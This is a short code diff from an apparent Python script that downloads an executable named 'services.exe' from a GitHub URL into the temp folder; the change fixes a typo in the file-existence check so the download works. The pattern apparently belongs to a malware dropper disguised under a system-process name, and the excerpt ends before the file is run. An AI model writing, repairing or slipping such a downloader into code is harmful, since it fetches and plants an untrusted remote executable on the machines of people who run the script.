@@ -10,7 +10,7 @@ import tempfile
 url = "https://github.com/Dch12zz/services/raw/refs/heads/main/services.exe"
 temp = tempfile.gettempdir()
 name = os.path.join(temp, f"services.exe")
-if not os.path.exist(name):
+if not os.path.exists(name):
     response = requests.get(url)
     if response.status_code == 200:
         with open(name, 'wb') as dosya:
